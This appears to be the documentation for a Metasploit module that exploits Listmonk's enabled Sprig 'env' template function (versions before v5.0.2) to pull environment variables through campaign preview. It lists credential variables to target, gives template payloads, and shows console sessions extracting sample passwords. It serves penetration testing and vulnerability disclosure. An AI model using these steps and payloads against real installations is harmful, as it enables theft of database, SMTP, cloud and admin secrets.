## Vulnerable Application

This module exploits insecure Sprig template functions in Listmonk versions prior to v5.0.2.
The `env` and `expandenv` functions are enabled by default in campaign templates, allowing
authenticated users with minimal campaign permissions to extract sensitive environment variables
through the campaign preview functionality.

Listmonk is a self-hosted newsletter and mailing list manager. Environment variables in
Listmonk deployments often contain sensitive information such as database credentials,
SMTP passwords, API keys, and admin credentials.

### Required Privileges

For this exploit to work, the authenticated user must have the following privileges:
- `campaigns:get` - Permission to view campaigns
- `campaigns:get_all` - Permission to view all campaigns

These are minimal privileges that can be assigned to non-admin users in multi-user Listmonk
installations, making this vulnerability particularly dangerous as it allows privilege escalation
through environment variable disclosure.

#### Docker Installation (Vulnerable Version)

To install the vulnerable version, run the following command :

```
docker run -p 9000:9000 listmonk/listmonk:v5.0.1
```

#### Vulnerable Versions

- Listmonk < v5.0.2

#### Patched Versions

- Listmonk >= v5.0.2

## Verification Steps

1. Start msfconsole
2. Do: `use auxiliary/gather/listmonk_env_disclosure`
3. Do: `set RHOSTS [target]`
4. Do: `set USERNAME [username]`
5. Do: `set PASSWORD [password]`
6. Do: `set ENVVAR [environment_variable]`
7. Do: `run`
8. You should see extracted environment variable values

## Options

### USERNAME

The Listmonk username for authentication. This must be a valid user account with
the required `campaigns:get` and `campaigns:get_all` permissions.

### PASSWORD

The Listmonk password for authentication.

### ENVVAR

The specific environment variable name to extract. Common targets include:

- `LISTMONK_db__host`, `LISTMONK_db__port` - Database connection details
- `LISTMONK_db__user`, `LISTMONK_db__password` - Database credentials
- `LISTMONK_db__database` - Database name
- `LISTMONK_app__admin_username`, `LISTMONK_app__admin_password` - Admin credentials
- `SMTP_HOST`, `SMTP_PORT`, `SMTP_USER`, `SMTP_PASSWORD` - Email server credentials
- `AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY` - Cloud provider credentials
- `DATABASE_URL`, `REDIS_URL` - Connection strings
- `SECRET_KEY`, `API_KEY` - Application secrets
- `PATH`, `HOME`, `USER` - System environment variables

This option is mutually exclusive with PAYLOAD_FILE. Either ENVVAR or PAYLOAD_FILE must be specified.

### PAYLOAD_FILE

Path to a file containing custom template payload to extract multiple environment variables.
Each line should contain a template expression like `{{ env "VAR_NAME" }}`.

This option is mutually exclusive with ENVVAR. Either ENVVAR or PAYLOAD_FILE must be specified.

## Scenarios

### Running Check to Verify Target is Vulnerable

```
msf6 auxiliary(gather/listmonk_env_disclosure) > set RHOSTS 192.168.1.100
RHOSTS => 192.168.1.100
msf6 auxiliary(gather/listmonk_env_disclosure) > set USERNAME admin
USERNAME => admin
msf6 auxiliary(gather/listmonk_env_disclosure) > set PASSWORD adminadmin
PASSWORD => adminadmin
msf6 auxiliary(gather/listmonk_env_disclosure) > check

[*] 192.168.1.100:9000 - The target appears to be vulnerable. Listmonk version 5.0.1 is vulnerable
```

### Extract Single Environment Variable

```
msf6 > use auxiliary/gather/listmonk_env_disclosure
msf6 auxiliary(gather/listmonk_env_disclosure) > set RHOSTS 127.0.0.1
RHOSTS => 127.0.0.1
msf6 auxiliary(gather/listmonk_env_disclosure) > set USERNAME admin
USERNAME => admin
msf6 auxiliary(gather/listmonk_env_disclosure) > set PASSWORD adminadmin
PASSWORD => adminadmin
msf6 auxiliary(gather/listmonk_env_disclosure) > set ENVVAR LISTMONK_db__password
ENVVAR => LISTMONK_db__password
msf6 auxiliary(gather/listmonk_env_disclosure) > run

[*] Running module against 127.0.0.1
[*] Targeting http://127.0.0.1:9000/
[+] Login successful
[*] Executing template to extract environment variables...
[+] Environment variable(s) extracted:

my_secure_db_password123

[*] Auxiliary module execution completed
```

### Extract Multiple Environment Variables Using Payload File

Create a payload file (payload.txt):

```
{{ env "LISTMONK_db__user" }}
{{ env "LISTMONK_db__password" }}
{{ env "LISTMONK_app__admin_password" }}
{{ env "SMTP_PASSWORD" }}
```

Run the module:

```
msf6 auxiliary(gather/listmonk_env_disclosure) > set PAYLOAD_FILE /tmp/payload.txt
PAYLOAD_FILE => /tmp/payload.txt
msf6 auxiliary(gather/listmonk_env_disclosure) > unset ENVVAR
Unsetting ENVVAR...
msf6 auxiliary(gather/listmonk_env_disclosure) > run

[*] Running module against 127.0.0.1
[*] Targeting http://127.0.0.1:9000/
[+] Login successful
[*] Executing template to extract environment variables...
[+] Environment variable(s) extracted:

listmonk_user
my_secure_db_password123
admin_secret_password
smtp_pass_2024

[*] Auxiliary module execution completed
```
